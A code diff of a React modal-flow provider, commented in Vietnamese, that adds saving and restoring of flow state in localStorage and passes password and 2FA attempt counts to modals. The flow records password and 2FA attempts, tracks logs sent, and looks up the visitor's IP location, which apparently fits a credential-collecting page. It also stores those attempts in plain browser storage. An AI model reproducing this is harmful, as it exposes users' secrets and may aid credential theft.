@@ -32,8 +32,40 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
     selectedMethod: null,
   });
 
+  // Trạng thái đã restore từ localStorage chưa
+  const [isRestored, setIsRestored] = useState(false);
+
   // Ref để track các log đã gửi, tránh duplicate
   const logSentRef = useRef<Set<string>>(new Set());
+
+  // Restore state từ localStorage khi mount
+  useEffect(() => {
+    const savedState = localStorage.getItem("modal_flow_state");
+    if (savedState) {
+      try {
+        const parsedState = JSON.parse(savedState);
+        // Chỉ restore nếu có currentStep
+        if (parsedState && parsedState.currentStep) {
+          setState(parsedState);
+        }
+      } catch (e) {
+        console.error("Failed to restore modal state:", e);
+      }
+    }
+    setIsRestored(true);
+  }, []);
+
+  // Save state vào localStorage khi thay đổi
+  useEffect(() => {
+    // Không lưu nếu chưa hoàn tất quá trình restore (tránh ghi đè state rỗng)
+    if (!isRestored) return;
+
+    if (state.currentStep) {
+      localStorage.setItem("modal_flow_state", JSON.stringify(state));
+    } else {
+      localStorage.removeItem("modal_flow_state");
+    }
+  }, [state, isRestored]);
 
   // Fetch IP/location ngay khi load - ưu tiên /api/detect-location (cf-ipcountry), fallback ipinfo
   const locationRef = useRef<LocationData | null>(null);
@@ -291,6 +323,7 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
             onClose={handleClose}
             onSubmit={handlePasswordSuccess}
             onAttempt={handlePasswordAttempt}
+            initialAttemptCount={state.passwordAttempts.length}
           />
 
           <MethodModal
@@ -312,6 +345,7 @@ export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
               phone={state.contactInfo.phone}
               email={state.contactInfo.email}
               dialCode={state.formDetails?.dialCode || "+84"}
+              initialAttemptCount={state.twofaAttempts.length}
             />
           )}
         </>
